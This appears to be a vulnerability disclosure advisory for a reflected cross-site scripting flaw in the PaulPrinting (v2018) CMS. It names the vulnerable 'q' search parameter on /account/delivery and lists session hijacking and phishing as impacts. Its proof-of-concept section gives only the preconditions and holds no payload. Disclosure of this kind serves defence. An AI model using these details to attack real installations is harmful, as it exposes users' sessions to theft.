Technical Details & Description:
================================
A client-side cross site scripting vulnerability has been discovered in the official PaulPrinting (v2018) cms web-application.
Remote attackers are able to manipulate client-side requests by injection of malicious script code to compromise user session data.

The client-side cross site scripting web vulnerability is located in the search input field with the insecure validated q parameter
affecting the delivery module. Remote attackers are able to inject own malicious script code to the search input to provoke a client-side
script code execution without secure encode. The request method to execute is GET and the attack vector is non-persistent.

Successful exploitation of the vulnerability results in session hijacking, non-persistent phishing attacks, non-persistent external redirects
to malicious source and non-persistent manipulation of affected application modules.


Request Method(s):
[+] GET

Vulnerable Module(s):
[+] /account/delivery

Vulnerable Input(s):
[+] Search

Vulnerable Parameter(s):
[+] q

Affected Module(s):
[+] /account/delivery
[+] Delivery Contacts


Proof of Concept (PoC):
=======================
The non-persistent xss web vulnerability can be exploited by remote attackers with low privileged user account and medium user interaction.
